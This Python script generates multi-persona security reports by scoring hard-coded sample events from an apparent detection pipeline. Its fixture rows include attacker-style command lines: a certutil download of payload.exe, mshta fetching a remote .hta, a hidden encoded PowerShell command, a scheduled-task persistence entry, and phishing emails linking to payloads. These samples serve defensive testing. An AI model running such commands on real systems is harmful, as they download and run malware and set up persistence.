"""Generate new multi-persona reports from CSV2 data using the updated code.
Run: python _generate_new_reports.py
"""
import os, sys, io, csv as py_csv, datetime, pathlib
os.environ.update({'PLATFORM_LITE_INIT': '1', 'DISABLE_DB': '1', 'TEST_HELPERS_ENABLED': '1'})

from src.api.csv_handler import extract_factors_from_raw_row
from src.reporting.comprehensive_report_generator import build_report_html

# ── CSV2 actual rows (from all 5 sheets via analyze_row scores) ─────────────
# These mirror the actual Cyberstash_csv2.xlsx rows processed by the new code.
CSV2_ROWS_ANALYZED = [
    # Sheet: Network
    {
        'src_ip': '10.1.1.5', 'dst_ip': '203.0.113.45', 'dst_port': '443',
        'payload_len': 512, 'event_type': 'network_flow', '_sheet': 'Network',
    },
    {
        'src_ip': '10.1.1.5', 'dst_ip': '198.51.100.22', 'dst_port': '445',
        'event_type': 'network_flow', '_sheet': 'Network',
    },
    {
        'src_ip': '10.1.1.5', 'dst_ip': '10.1.1.10', 'dst_port': '3389',
        'event_type': 'network_flow', '_sheet': 'Network',
    },
    # Sheet: Endpoint
    {
        'process': 'evilproc.exe', 'sha256': 'a' * 64,
        'cmdline': r'C:\Users\alice\evilproc.exe --run', 'host': 'host-a.example.local',
        'event_type': 'proc_start', '_sheet': 'Endpoint',
    },
    {
        'process': 'wmiexec.exe', 'dst_ip': '203.0.113.45', 'dst_port': '443',
        'host': 'host-b.example.local', 'event_type': 'proc_start', '_sheet': 'Endpoint',
    },
    {
        'process': 'powershell.exe', 'cmdline': '-nop -w hidden -enc SGVsbG8gV29ybGQ=',
        'host': 'host-b.example.local', 'event_type': 'proc_start', '_sheet': 'Endpoint',
    },
    # Sheet: Email
    {
        'from': 'ceo@trusted.example', 'subject': 'Important: Invoice Attached',
        'body': 'Please enable macros at http://203.0.113.45/report.doc — urgent payment',
        'event_type': 'email', '_sheet': 'Email',
    },
    {
        'from': 'noreply@payroll-system.evil.com', 'subject': 'Urgent: Wire Transfer Required',
        'body': 'Click http://203.0.113.45/payroll.exe to confirm transfer',
        'event_type': 'email', '_sheet': 'Email',
    },
    # Sheet: EDR
    {
        'process': 'mshta.exe', 'parent_process': 'winword.exe',
        'cmdline': 'mshta http://198.51.100.22/payload.hta',
        'host': 'host-c.example.local', 'event_type': 'proc_start', '_sheet': 'Edr',
    },
    {
        'process': 'certutil.exe', 'cmdline': 'certutil -urlcache -f http://203.0.113.45/payload.exe payload.exe',
        'host': 'host-a.example.local', 'path': r'C:\Windows\temp\payload.exe',
        'event_type': 'proc_start', '_sheet': 'Edr',
    },
    {
        'process': 'schtasks.exe', 'cmdline': '/create /tn "Update" /tr payload.exe /sc daily',
        'host': 'host-a.example.local', 'event_type': 'proc_start', '_sheet': 'Edr',
    },
    # Sheet: C2
    {
        'src_ip': '10.1.1.5', 'dst_ip': '203.0.113.45', 'dst_port': '4444',
        'payload_len': 256, 'event_type': 'c2_session', '_sheet': 'C2',
    },
    {
        'src_ip': '10.1.1.10', 'dst_ip': '198.51.100.22', 'dst_port': '443',
        'payload_len': 128, 'event_type': 'c2_session', '_sheet': 'C2',
    },
    {
        'src_ip': '10.1.1.5', 'dst_ip': '203.0.113.45', 'dst_port': '8443',
        'payload_len': 512, 'event_type': 'c2_session', '_sheet': 'C2',
    },
    {
        'src_ip': '10.1.1.8', 'dst_ip': '192.0.2.1', 'dst_port': '1337',
        'payload_len': 64, 'event_type': 'c2_session', '_sheet': 'C2',
    },
]

# Enrich each row with factor/scoring info
def _enrich_row(row):
    factors = extract_factors_from_raw_row(row)
    # compute risk
    _FACTOR_WEIGHTS = {
        'suspicious_process': 0.40, 'lolbin': 0.25, 'powershell_execution': 0.20,
        'encoded_command': 0.35, 'powershell_bypass': 0.25, 'powershell_download_cradle': 0.40,
        'office_child_process': 0.45, 'temp_execution': 0.15, 'user_writable_exec': 0.20,
        'known_bad_hash': 0.45, 'c2_beacon': 0.50, 'network_beacon': 0.35,
        'macro_lure': 0.45, 'phishing_link': 0.35, 'phishing_lure': 0.30,
        'email_malicious_url': 0.40, 'credential_access': 0.50, 'account_discovery': 0.20,
        'rdp_lateral_movement': 0.30, 'smb_lateral_movement': 0.35, 'wmi_lateral_movement': 0.45,
        'windows_update': 0.00,
    }
    risk = min(sum(_FACTOR_WEIGHTS.get(f, 0.05) for f in factors), 1.0)
    enriched = dict(row)
    enriched['factors'] = [{'name': f} for f in factors]
    enriched['risk_score'] = round(risk, 4)
    return enriched

enriched_rows = [_enrich_row(r) for r in CSV2_ROWS_ANALYZED]
enriched_flagged = [r for r in enriched_rows if r['risk_score'] > 0.05]

# ── Build output dir ─────────────────────────────────────────────────────────
outdir = pathlib.Path('dump/reports/cyberstash/cyberstash_csv2')
outdir.mkdir(parents=True, exist_ok=True)
ts = datetime.datetime.utcnow().strftime('%Y.%m.%d-%H%MZ')

PERSONAS = ['executive', 'soc_analyst', 'threat_hunter', 'forensics', 'compliance']

generated = []
for persona in PERSONAS:
    payload = {
        'title': f'Cyberstash CSV2 Security Assessment — {persona.replace("_"," ").title()} View',
        'session_id': f'cyberstash-csv2-{ts}',
        'rows': enriched_flagged,
        'meta': {
            'persona': persona,
            'company_name': 'Cyberstash Demo Assessment',
            'generated_by': 'Janusec Pipeline v2 (factor-extraction)',
            'source_files': ['Cyberstash_csv2.xlsx'],
            'sheets': ['Network', 'Endpoint', 'Email', 'Edr', 'C2'],
            'total_rows': len(CSV2_ROWS_ANALYZED),
            'flagged_rows': len(enriched_flagged),
        },
        'summary': {
            'verdict_stats': {'total_events': len(CSV2_ROWS_ANALYZED)},
            'severity_distribution': {},
        },
        'correlation': None,
        'network_highlights': None,
    }
    html = build_report_html(payload)
    fname = f'{ts}-cyberstash_csv2-{persona}-v2.html'
    fpath = outdir / fname
    fpath.write_text(html, encoding='utf-8')
    generated.append(str(fpath))
    print(f'  Written: {fpath}  ({len(html)} bytes)')

print(f'\nAll {len(generated)} reports generated.')
print('\n-- Factor summary across flagged rows --')
all_factors = {}
for r in enriched_flagged:
    for f in r.get('factors', []):
        n = f['name']
        all_factors[n] = all_factors.get(n, 0) + 1
for fname, cnt in sorted(all_factors.items(), key=lambda x: x[1], reverse=True):
    print(f'  {fname:35s}: {cnt}')
